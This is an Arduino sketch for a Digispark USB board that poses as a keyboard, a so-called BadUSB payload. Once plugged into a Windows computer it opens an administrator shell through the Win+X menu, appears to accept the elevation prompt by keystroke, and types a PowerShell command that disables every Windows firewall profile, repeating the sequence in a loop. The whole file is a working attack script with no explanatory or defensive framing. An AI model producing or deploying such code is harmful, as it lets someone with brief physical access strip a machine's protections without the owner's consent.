#include "DigiKeyboard.h"

void setup() {
  //empty
}
void loop() {
	DigiKeyboard.sendKeyStroke(0);
	//
	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_X);
	DigiKeyboard.delay(500);
	DigiKeyboard.print("A");
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(80);
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(5000);
	DigiKeyboard.print("Set-NetFirewallProfile -Enabled False");
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.sendKeyStroke(UNDEFINED_KEY);
}